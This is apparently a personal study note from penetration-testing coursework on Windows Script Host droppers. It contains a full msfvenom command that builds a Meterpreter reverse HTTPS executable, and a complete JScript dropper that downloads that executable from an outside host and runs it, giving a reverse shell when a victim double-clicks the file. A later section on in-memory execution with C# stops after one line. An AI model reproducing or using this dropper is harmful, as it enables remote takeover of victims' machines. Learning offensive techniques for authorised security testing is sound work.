---
creation date: December 21st 2022
last modified date: December 21st 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Windows Script Host]]  
___

## Description:  
Look for default apps in windows settings, if the default application for .js files is Windows-Based Script host (should be by default), then our code should run automatically after a double-click.

### Jscript
use msfvenom to generate a 64-bit Meterpreter reverse HTTPS executable named met.exe:
```
kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o met.exe
```
Now create the dropper code (save as a .js):
```
var url = "http://192.168.119.120/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{ 
	var Stream = WScript.CreateObject('ADODB.Stream');

	Stream.Open();
	Stream.Type = 1; // adTypeBinary
	Stream.Write(Object.ResponseBody);
	Stream.Position = 0;

	Stream.SaveToFile("met.exe", 2);
	Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```
After saving this code as a .js file, all we need to do is double-click it to get a 64-bit shell from the victim’s machine to our awaiting multi/handler listener.

### Using Jscript and C sharp
To run our payload completely from memory

Launch Visual Studio and choose Create a new project. 



___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 21st 2022 (05:46 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
